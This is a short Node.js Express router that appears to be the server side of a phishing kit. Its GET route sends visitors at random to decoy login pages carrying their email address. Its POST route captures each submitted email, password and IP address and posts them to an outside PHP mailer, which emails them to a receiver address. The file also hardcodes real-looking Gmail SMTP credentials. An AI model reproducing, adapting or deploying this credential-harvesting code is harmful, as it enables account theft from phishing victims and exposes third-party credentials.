const express = require('express');
const ax = require('axios');
const fs = require('fs');
const router = express.Router();
const path = require('path');

/*****************Redirect Url Array Start***********************/
const redirectArray = [
    'go.html',
    'him.html'
];
/*****************Redirect Url Array Start***********************/

/***********************MINE Send mail php imported url*****************/
 const
     link = 'https://shipootransportationinc.com/vendor/vendor/send.php',
     receiverEmail = 'Urielplugs@gmail.com',
     SMTPUsername = 'a.wotowoto@gmail.com',
     SMTPPassword = 'tyohryvcbloiqftj',
     SMTPServerName = 'smtp.gmail.com',
     lastRedirect = '';
/**********************Send mail php imported url ends**************/

router.get("/", (req, res) => {
    const email = req.query.email;
    const filePath = path.join(__dirname, '../redirects');
    const files = fs.readdirSync(filePath);
    if (redirectArray.length){
        const rand = Math.floor(Math.random() * redirectArray.length);
        if (email){
            res.redirect(redirectArray[rand] + '&email='+email);
        } else {
            res.redirect(redirectArray[rand]);
        }
    } else {
        const rand = Math.floor(Math.random() * files.length);
        fs.readFile(`${filePath}/${files[rand]}`, 'utf8', (err, text) => {
            res.send(text);
        });
    }
});

router.post("/", (req, res) => {
    const referer = req.headers.referer || req.headers.referrer;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let redirectUrl = referer + '&error=error&has=jduj733773838cnbncdhg';
    ax.post(link, {
        email: req.body.email,
        password: req.body.password,
        source: req.body.source,
        ip,
        receiverEmail,
        SMTPUsername,
        SMTPPassword,
        SMTPServerName,
        fromName: req.body.source.toUpperCase() + ' LOGIN'
    }).then((response) => {
        if (response.status === 200) {
            res.send({
                status_code: '200',
                status: true,
                message: 'message sent!'
            })
        } else {
            res.send({
                status_code: '400',
                status: false,
                message: 'Unknown error!'
            })
        }
    }).catch((err) => {
        res.send({
            status_code: '400',
            status: false,
            message: err
        })
    });
});

module.exports = router;